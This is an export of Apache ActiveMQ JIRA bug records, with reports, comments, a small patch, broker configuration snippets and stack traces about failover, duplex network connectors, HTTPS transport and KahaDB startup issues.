https://issues.apache.org/activemq/secure/attachment/19504/activemq-bug-2774-tcpToSsl.log;;;","27/Jul/10 15:37;eric-awl;Yes, with DUPLEX connection, the network connector thread is completely frozen into the start() call. With not Duplex connection, son threads are created and are blocked on the same latch, but the connector is not frozen.

The problem is the same. As we are far more worried by the DUPLEX problem, I choose to demonstrate the bug with DUPLEX connection.

If you have an environment test with source codes, perhaps you can use my patch (only 3 class to change) and tell us what happens on your configuration ???

I can provide you the activemq-all-5.3.2.jar with my patch.

Eric-AWL;;;","28/Jul/10 08:40;s1ngle;	> I can provide you the activemq-all-5.3.2.jar with my patch.

Ok, please, because 

	> (only 3 class to change)

I can see 9 classes in  AMQ2774.tar and 1 class [SocketTstFactory.java] added separately.;;;jira-users","28/Jul/10 08:42;eric-awl;The jar with the patch;;;","28/Jul/10 08:49;eric-awl;in the tar file, there are 3 changes for ActiveMQ classes, 6 new test classes and one ressource file (that declares a new transport that simulate network faults)


Changes

- activemq-core/src/main/java/org/apache/activemq/broker/TransportConnection.java
- activemq-core/src/main/java/org/apache/activemq/network/DiscoveryNetworkConnector.java
- activemq-core/src/main/java/org/apache/activemq/network/DemandForwardingBridgeSupport.java

test classes

- activemq-core/src/test/java/org/apache/activemq/transport/tcp/TcpFaultyTransportFactory.java
- activemq-core/src/test/java/org/apache/activemq/transport/tcp/TcpFaultyTransport.java
- activemq-core/src/test/java/org/apache/activemq/transport/tcp/TcpFaultyTransportServer.java
- activemq-core/src/test/java/org/apache/activemq/transport/tcp/ServerSocketTstFactory.java
- activemq-core/src/test/java/org/apache/activemq/transport/tcp/SocketTstFactory.java
- activemq-core/src/test/java/org/apache/activemq/usecases/MulticastDiscoveryOnFaultyNetworkTest.java

Test ressource
- activemq-core/src/test/resources/META-INF/services/org/apache/activemq/transport/tcpfaulty


Then, I send SocketTstFactory.java again to change the network faults generation algorithm.

Eric-AWL;;;","28/Jul/10 10:19;s1ngle;Your solution passed all our JUNIT tests so it seems to get rid of the problem while not interfering current features.;;;","28/Jul/10 10:47;gtully;patch applied with thanks to r980014
Great to have the test case and additional validation, that is a some what messy area of the code base.

Just for future reference, svn diff is a great way to produce a patch as it just captures the differences. Makes it alot eastier to apply a patch to trunk when it was created from a branch.
Can you cast an eye over the diffs in the commit log just to be sure to be sure it is all there. thanks again. ;;;","28/Jul/10 11:32;eric-awl;All seems OK. And I think that ""tcpfaulty"" transport can be reused to verify a lot of things...

Be careful, I don't exactly know all consequences of my patch on cluster failover mechanisms (transportInterupted and transportResumed).

Atos Wordline works with ActiveMQ on a VERY VERY HUGE project in France (an ""electricity smart metering"" project). And this patch was very important for us.

I'm not in general development teams but in production teams. That's why I don't have a good SVN development environment.

Thank you
Eric-AWL (Atos Worldline).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
javax.jms.TopicPublisher is not announced via Advisory Topic,AMQ-2773,12483624,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,felixehm,felixehm,10/Jun/10 14:29,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"When using a javax.jms.TopicPublisher object over a TopicSession, no ActiveMQ.Advisory.Producer.Topic is created.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jun/10 14:32;felixehm;ProducerAnnouncementTest.java;https://issues.apache.org/jira/secure/attachment/12461736/ProducerAnnouncementTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60029,,,Tue Sep 20 11:01:39 UTC 2011,,,,,,,,,,,"0|i0akfb:",59582,,,,,,,,,,,,,,,,,,,,,"10/Jun/10 14:32;felixehm;You can use the attached (rudimentary) Test class to test this case. ;;;","05/Jul/11 19:48;tabish;The test case creates a TopicPublisher without an assigned destination, in which case there is no advisory message sent because the broker doesn't know what destination that producer will publish on.  If you assign it a Destination you will get the advisory.  The same is true for a standard producer, if you remove the destination from the createProducer call in the test it won't get an advisory message either.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQConnectionConsumer will break failover,AMQ-2772,12483134,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,siim_kaalep,siim_kaalep,10/Jun/10 08:42,11/Jun/10 13:44,14/Jul/23 05:43,11/Jun/10 13:44,5.3.2,,,,,5.4.0,,,Connector,,,,0,,,,,,,,,"ActiveMQConnection.transportInterupted assumes that
dispatchers.size() == all session's consumers + one advisoryConsumer

But ActiveMQConnectionConsumer also registers itself as dispatcher in constructor.

On failover attempt connection will remain in waiting state. 
Logging ""dispatch paused, waiting for outstanding dispatch interruption processing (1) to complete..""

ActiveMQConnectionConsumer is used in ActiveMQ resource adapter in ActiveMQEndpointWorker.


Robust fix:
{noformat} 
Index: trunk/activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java
===================================================================
--- trunk/activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java
+++ trunk/activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java
@@ -1840,7 +1840,7 @@
 	}
 
     public void transportInterupted() {
-        transportInterruptionProcessingComplete = new CountDownLatch(dispatchers.size() - (advisoryConsumer != null ? 1:0));
+        transportInterruptionProcessingComplete = new CountDownLatch(dispatchers.size() - (advisoryConsumer != null ? 1:0) - connectionConsumers.size());
         if (LOG.isDebugEnabled()) {
             LOG.debug(""transport interrupted, dispatchers: "" + transportInterruptionProcessingComplete.getCount());
         }
{noformat} ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74806,,,Fri Jun 11 13:44:19 UTC 2010,,,,,,,,,,,"0|i0rqcf:",159912,,,,,,,,,,,,,,,,,,,,,"11/Jun/10 13:44;gtully;patch applied to r953696 with an additional test case. We may need some additional MDB tests that validate transaction semantics in the event of failover and no redelivery but the existing rollback logic with a timeout should suffice.
In any event, this change will prevent the block with was just plain wrong. nice catch, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscription MBean shows incorrect active/inactive state.,AMQ-2770,12483116,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,akos.baraz,akos.baraz,09/Jun/10 10:00,15/Jun/10 14:08,14/Jul/23 05:43,15/Jun/10 14:08,5.3.2,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"active() and connectionId() shows incorrect activity states on Durable subscription MBeans. I cannot see if the subscription is online or offline.

Please check my test case.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jun/10 10:01;akos.baraz;ManagedDurableSubscriptionTest.java;https://issues.apache.org/jira/secure/attachment/12461735/ManagedDurableSubscriptionTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74807,,,Tue Jun 15 14:08:47 UTC 2010,,,,,,,,,,,"0|i0rqvz:",160000,,,,,,,,,,,,,,,,,,,,,"15/Jun/10 14:08;dejanb;fixed with svn revision 954893

You should check active property for this, since connectionId will not be OFFLINE if keepDurableSubsActive is used. Thanks for the test case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Topics hold consumers for unsubscribed durable subscriptions.,AMQ-2769,12483036,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,akos.baraz,akos.baraz,09/Jun/10 08:32,11/Jun/10 14:47,14/Jul/23 05:43,11/Jun/10 14:47,5.3.2,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"Session.unsubscribe (or broker.removeSubscription) does not remove the consumer from the topic's consumer list.
Please check my junit test case.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jun/10 08:32;akos.baraz;UnsubscribeTest.java;https://issues.apache.org/jira/secure/attachment/12461734/UnsubscribeTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74808,,,Fri Jun 11 14:47:35 UTC 2010,,,,,,,,,,,"0|i0rq9r:",159900,,,,,,,,,,,,,,,,,,,,,"11/Jun/10 14:47;dejanb;Fixed with svn revision 953708;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
HTTPS transportConnector does not create a SslSocket but a plain text one,AMQ-2768,12483153,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,,munger,munger,08/Jun/10 12:43,08/Jun/10 14:06,14/Jul/23 05:43,08/Jun/10 14:06,5.3.2,,,,,,,,Connector,,,,0,,,,,,,,,"Trying to enable HTTPS transportConnector in activemq.xml file, it is impossible to make it communicate in SSL.

I added the line:
<transportConnector name=""https"" uri=""https://localhost:8443"" enableStatusMonitor=""true""/> 

in the activemq.xml file,

and i can see at startup that a plain text socket seem to have been created, instead of a ssl one:

14:36:23,119  INFO org.mortbay.log.Slf4jLog 67 <main> Started SocketConnector@localhost:8443
14:36:23,119  INFO org.apache.activemq.broker.TransportConnector 250 <main> Connector https Started
14:36:23,119  INFO org.mortbay.log.Slf4jLog 67 <main> jetty-6.1.22

When i connect with a https client (based on Spring JmsTemplate class), i cannot connect. I have to mention also that i can successfully connect using ssl connection (so the certificates are OK) and also in HTTP.

Thanks a lot for your work!","Windows, in a Spring Based app, already embedding another Jetty server for app GUI, and embedding ActiveMQ.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74809,,,Tue Jun 08 14:06:06 UTC 2010,,,,,,,,,,,"0|i0rzqv:",161435,Regression,,,,,,,,,,,,,,,,,,,,"08/Jun/10 13:32;dejanb;Thanks for this submission. It would be even better if you could provide a simple test case that demonstrates the issue.;;;","08/Jun/10 14:06;munger;Ok it works !!!!!!!!!!!!! :) 

The problem was very simple : i had to upgrade from activemq-optional-5.2.jar to activemq-optional-5.3.1.jar 

Shame on me ! ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"After failover, messages will not be delivered to MessageEndpoint",AMQ-2765,12482973,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,kevan,kevan,04/Jun/10 22:22,16/Jun/10 14:54,14/Jul/23 05:43,15/Jun/10 17:21,5.3.2,5.4.0,,,,5.4.0,,,Transport,,,,0,,,,,,,,,"After a failover from one broker to another, message delivery to MessageEndpoints stops. 

Standalone messaging clients seem to work fine, but RA delivery does. I see this behavior in Geronimo and have built a JUnit test which seems to show the problem, also.",,kevan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jun/10 22:29;kevan;AMQ-2765.patch;https://issues.apache.org/jira/secure/attachment/12461729/AMQ-2765.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74811,,,Wed Jun 16 14:54:07 UTC 2010,,,,,,,,,,,"0|i0rr6v:",160049,,,,,,,,,,,,,,,,,,,,,"04/Jun/10 22:29;kevan;This test will create two brokers in a shared filesystem/Master-Slave configuration. A connection is established to the master broker. The master broker is then stopped. The client reconnects to the slave. However, no messages will be delivered to the MessageEndpoint.;;;","04/Jun/10 22:35;bsnyder;This issue looks similar to AMQ-2743 that is filed against 5.3.1 that did not exist in 5.3.0. ;;;","06/Jun/10 16:50;kevan;Interesting. Thanks Bruce.

By the way, you need to clear out the message log (e.g. 'rm -rf activemq-data/'), if you're running this test multiple times. Otherwise, an undelivered message in the message log is delivered to the client (prior to the failover). Is there a programatic way to clear the log during Junit setup?;;;","07/Jun/10 13:42;kevan;I ran my test on 5.3.0 and 5.3.1. I see the same behavior that Bruce describes. Works on 5.3.0. Does not work on 5.3.1.;;;","15/Jun/10 17:21;gtully;resolved in r954972
same issue as https://issues.apache.org/activemq/browse/AMQ-2772 just that the fix needed a rework such that connectionConsumers can have their prefetch reinstated.

There may be a need to do some interruption processing on the RA connection consumers, in the same way that a regular consumer needs to deal with the duplicate checker. We can cross that bridge when we come to it. For the moment, the connectionConsumers just allow immediate redelivery without doing any additional work;;;","15/Jun/10 17:24;gtully;btw, thanks for the good test.;;;","16/Jun/10 14:54;kevan;Works great. Thanks Gary!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"For ""duplex"" network connection,  after restart one ActiveMQ,  message is missing.",AMQ-2764,12483855,12483840,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,qingyi,qingyi,04/Jun/10 18:33,05/Nov/10 23:04,14/Jul/23 05:43,27/Aug/10 11:58,5.3.1,,,,,5.4.1,5.4.2,,Broker,,,,0,,,,,,,,,"I have two AMQ setup.  And they use duplex network connection between.   After I restart one ActiveMQ which initiates the connection,  half of the message are missing.    In order to avoid this problem,  I have restart the other ActiveMQ.   And this  happens when I use ""staticallyIncludedDestinations"" or ""dynamicallyIncludedDestinations"" config in broker.

1 SETUP:
a) SCA server has a network connector to remote server114.  In order to repeat this problem, you have to use ""staticallyIncludedDestinations"".

<networkConnector name=""SCA"" uri=""static://(https://192.168.3.114:61617)"" duplex=""true"">
               <staticallyIncludedDestinations>
                              <queue physicalName=""R""/>
               </staticallyIncludedDestinations>
</networkConnector>

b) SCA server has a java code consumer listening on queue R:

c)  Remote server114 is listening on 61617, see config below;
<transportConnectors> 
           <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/> 
           <transportConnector name=""https"" uri=""https://0.0.0.0:61617?needClientAuth=true""/> 
</transportConnectors> 
(See attached picture ""Remote-Console1.jpg"".)

2. Restart activemq on SCA server and restart consumer application listening on queue R on SCA too.  Remote server114 activemq admin console shows there are two consumers on R. 
(See attached picture ""Remote-Console2.jpg"")

3 Start a producer on remote server114 to send 10 messages to R.  On SCA server, consumer on R  only receives 5 messages.
(See attached picture ""SCA-consumer1.JPG"")

4. On remote server114 activemq admin console, these 10 messages are divided by these two consumers.
(See attached picture ""Remote-Console3.jpg"")


","Windows2k3,  AMQ 5.3.1, ",slewis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2894,AMQ-2831,,"04/Jun/10 18:34;qingyi;Remote-Console1.JPG;https://issues.apache.org/jira/secure/attachment/12461725/Remote-Console1.JPG","04/Jun/10 18:34;qingyi;Remote-Console2.JPG;https://issues.apache.org/jira/secure/attachment/12461726/Remote-Console2.JPG","04/Jun/10 18:34;qingyi;Remote-Console3.JPG;https://issues.apache.org/jira/secure/attachment/12461727/Remote-Console3.JPG","04/Jun/10 18:35;qingyi;SCA-consumer1.JPG;https://issues.apache.org/jira/secure/attachment/12461728/SCA-consumer1.JPG","24/Aug/10 20:58;slewis;test-case.txt;https://issues.apache.org/jira/secure/attachment/12461681/test-case.txt","23/Aug/10 20:48;slewis;test-case.txt;https://issues.apache.org/jira/secure/attachment/12461674/test-case.txt",,,,,,,,,,,,,,,,6.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14842,,,Wed Oct 06 13:44:44 UTC 2010,,,,,,,,,,,"0|i0b9zb:",63729,,,,,,,,,,,,,,,,,,,,,"12/Jul/10 13:47;lcurry;Steps to reproduce the issue
----------------------------------
To reproduce this issue I installed apache-activemq-5.3.2 in two separate locations. The scenario simulates a hub and spoke architecture in which the hub (Broker1) will be connected (via a networkConnector) to Broker2. The network connector uses ""http"" rather than ""tcp"" for connection between brokers. This is a requirement for customer because customer  broker connection must traverse distinct networks. Note the problem does not seem to occur when ""tcp"" is used. The networkConnector also defines a ""staticallyIncludedDestination"".

The problem happens when Broker1 is shutdown and restarted. After that, the networkConnector (store and forward)
mechanism seems to break. Messages that should be available to a consumer in queue on Broker1 are not sent to consumer
and appear to be lost.  

The actual config details are given below. Also attached are the activemq.xml files for Broker1 and Broker2.

1)	Update activemq.xml for Broker1.
The changes to the default configuration for Broker1 include the following: 
•	Change the broker name from localhost to Broker1
•	Add networkConnector to Broker2.

    <broker xmlns=""http://activemq.apache.org/schema/core"" useJmx=""true"" brokerName=""BROKER1"" dataDirectory=""${activemq.base}
/data"" destroyApplicationContextOnStop=""true"" >

...
...
      <networkConnectors>
              <networkConnector name=""SCA"" uri=""static://(http://localhost:61617)"" duplex=""true"">
                      <staticallyIncludedDestinations>
                      <queue physicalName=""R""/>
                      </staticallyIncludedDestinations>
              </networkConnector>
      </networkConnectors>


2)	Update the activemq.xml for Broker2
The changes to the default configuration for Broker2 include the following:
•	Change the broker name from localhost to Broker2
•	Change the default transport connector (tcp) to listen on 61618 (to avoid conflict with Broker1's tcp port)
•	Add an transport connector (http) for port 61617. This is the port that will be connected to by Broker1.

    <broker xmlns=""http://activemq.apache.org/schema/core"" useJmx=""true"" brokerName=""BROKER2"" dataDirectory=""${activemq.base}
/data"" destroyApplicationContextOnStop=""true"">
...
...
       <transportConnectors>
           <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61618""/>
           <transportConnector name=""http"" uri=""http://0.0.0.0:61617""/>
       </transportConnectors>



3)	Start Broker2 using the activemq.bat script in Broker2's installation /bin directory.
4)	Start Broker1 using the activemq.bat script in Broker1's installation /bin directory.


5)	Run simple producer/consumer scenarios.
a)	Run consumer against 61616 (Broker1).
 Go to Broker1's example directory:
E.g.
C:\Progress\apache-activemq-5.3.2\example
Run the following:

	ant consumer -Durl=tcp://localhost:61616 -Dmax=100 -Dsubject=R
The above command will connect to Broker1 and listen for 100 messages on queue R on Broker1

b)	Next in another window - same directory - run the following:
	ant producer -Durl=tcp://localhost:61616 -Dmax=10 -Dsubject=R
The above command will connect to Broker1 and send 10 messages to queue R on Broker1

You should see the consumer will receive the 10 messages.
c)	Next, Run producer to send messages to Broker2:
	ant producer -Durl=tcp://localhost:61618 -Dmax=10 -Dsubject=R
Because of the networkConnector set up for queue R between Broker1->Broker2, the consumer (that was already running and connected to Broker1) should also receive these 10 messages that were sent to queue R on Broker2.

6)	Shutdown Broker1 and restart.

7)	Run step 5 again. You will see when you run the producer the second time (step 5c) that not all the messages get to the consumer connected to queue R on Broker1. Only every other message arrive at consumer. 

You can shutdown Broker1 and repeat step 5 over and over and each time you will see fewer and fewer messages arrive at consumer connected to queue R on Broker1.  Where do these messages go?

Information from jconsole
-------------------------------
While running this test case, start jconsole and attach to each of the brokers.
On Broker2 open the MBeans tab and expand activemq->BROKER2->Subscription->Non-Durable->Queue->R->NC_BROKER1_inbound_BROKER2
This will show the subscription created on Broker2 by the networkConnector.
Each time you shutdown Broker1 and restart, jconsole will show a new Subscription created in Broker2.
;;;","23/Aug/10 20:48;slewis;I've put together a test case (attached test-case.txt) similar to the NetworkReconnectTest that specifically goes through the steps in Lowry's description but I can't seem to reproduce this on trunk.  Have you tried this on the 5.4 release or on the latest snapshot?;;;","24/Aug/10 13:03;qingyi;I just tested with AMQ5.4.0 release,  the problem still exists.  I looked at your activemq config in your test case.  I think you have broker1 and broker2 reversed based on Lowry's description.   There is one little typo in Lowry's comment.   In his first step ""1) Update activemq.xml for Broker1."",  it should be ""Add networkConnector to Broker1"", not  ""Add networkConnector to Broker2."".;;;","24/Aug/10 20:58;slewis;Thanks for that, have re-worked the test case and it does reproduce the issue now, have attached an update.;;;","25/Aug/10 11:46;gtully;it looks like due to http being async the bridge does not get torn down when the remote broker shutsdown as is the case with a tcp connection. With tcp there is always an outstanding read that will fail. It looks like the failed read is is being retried in the http case.
It may be a case of configuring retry semantics for http client but I think it may need some duplicate detection of network connectors based on name or something. need to research it a bit.
;;;","27/Aug/10 11:58;gtully;fix in r990107

InactivityMonitor added to http transport by default. May be disabled via query parameters useInactivityMonitor=false for clients and transport.useInactivityMonitor=false on the broker side.
The default 30second timeout can be configured via url query params:
{code}""http://localhost:61617?transport.readCheckTime=4000&amp;transport.initialDelayTime=4000""{code} For a duplex network connector, these are applied to the target broker http listener so that they apply to the return network connector transport connection.
test case included, was a great help, thanks.;;;","06/Oct/10 13:44;dejanb;An additional fix that enables transport options to persist connector restart has been committed with svn revision 1005033 and will be available in 5.5.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Nullpointer-Exception in Queue.send,AMQ-2759,12483729,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jteetel,jteetel,02/Jun/10 16:03,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"We found the following NullPointerException in our logs:

2010-06-02 07:13:15,434 WARN  org.apache.activemq.broker.TransportConnection.Service - Async error occurred: java.lang.NullPointerException
java.lang.NullPointerException
        at org.apache.activemq.broker.region.Queue.send(Queue.java:442)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
        at de.telefonica.CustomBrokerFilter.send(CustomBrokerFilter.java:103)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:446)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
        at java.lang.Thread.run(Thread.java:619)

This is logged only as log level WARN. Is this a severe problem that we should be concerned about?
",red had enterprise,jteetel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Jun/10 17:51;jteetel;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461723/activemq.xml",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60058,,,Tue Sep 20 11:01:34 UTC 2011,,,,,,,,,,,"0|i0agzr:",59026,,,,,,,,,,,,,,,,,,,,,"29/Jun/11 21:51;tabish;Not enough information to reproduce or test the issue.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ startup fails during Startup due to NullPointerException in KahaDB,AMQ-2757,12482804,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,tschoeftner,tschoeftner,02/Jun/10 11:29,12/Jul/10 11:20,14/Jul/23 05:43,12/Jul/10 11:20,5.2.0,5.3.0,5.3.1,,,5.4.0,,,Message Store,,,,0,,,,,,,,,"During a long-time test run several message consumers listening to peristent queues crashed.
The queues were filling up rapidly, so that KahaDB allocated 3GB of disk space (max. limit 10GB) after 5hours (approx 800k messages).
At that point the broker was extremely slow and non-responsive to new messages.
JConsole showed that 1GB of RAM was used and most effort was necessary for garbage collection.
Although the max memory usage limit is configured to 1GB, AMQ should rather allocate disc space for messages to queues without containers.

AMQ shutdown took extremely long (several limits).
The subsequent AMQ restart keeps failing with the following exception:
java.lang.NullPointerException
	at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:109)
	at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:120)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:223)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:220)
	at org.apache.activemq.broker.region.Queue.initialize(Queue.java:252)
	at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:83)
	at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:464)
	at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56)
	at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:120)
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:268)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149)
